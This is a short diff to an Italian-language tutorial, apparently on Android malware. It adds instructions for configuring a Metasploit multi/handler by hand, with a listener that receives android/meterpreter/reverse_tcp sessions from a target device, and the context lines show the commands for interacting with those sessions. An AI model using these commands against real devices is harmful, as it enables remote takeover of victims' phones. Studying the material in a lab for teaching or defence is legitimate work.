@@ -35,3 +35,17 @@ sessions -i 1 # Interact with session 1
 Il primo comando non è in realtà necessario: questo serve solo a ottenere una
 lista di sessioni avviate in modo da poterne leggere l'ID da utilizzare nel
 secondo comando (che avvia realmente la comunicazione con il device target).
+
+Nel caso in cui non sia stato creato il file di configurazione di Metasploit, è
+comunque possibile procedere a una configurazione manuale. Per farlo, basta
+avviare la console di Metasploit mediante il comando `msfconsole`, ed eseguire
+poi i seguenti comandi:
+
+[source,shell]
+--------------
+use multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.1.187 # Your private IP
+set LPORT 4444 # The same port used in the malware creation
+exploit -j -z
+--------------
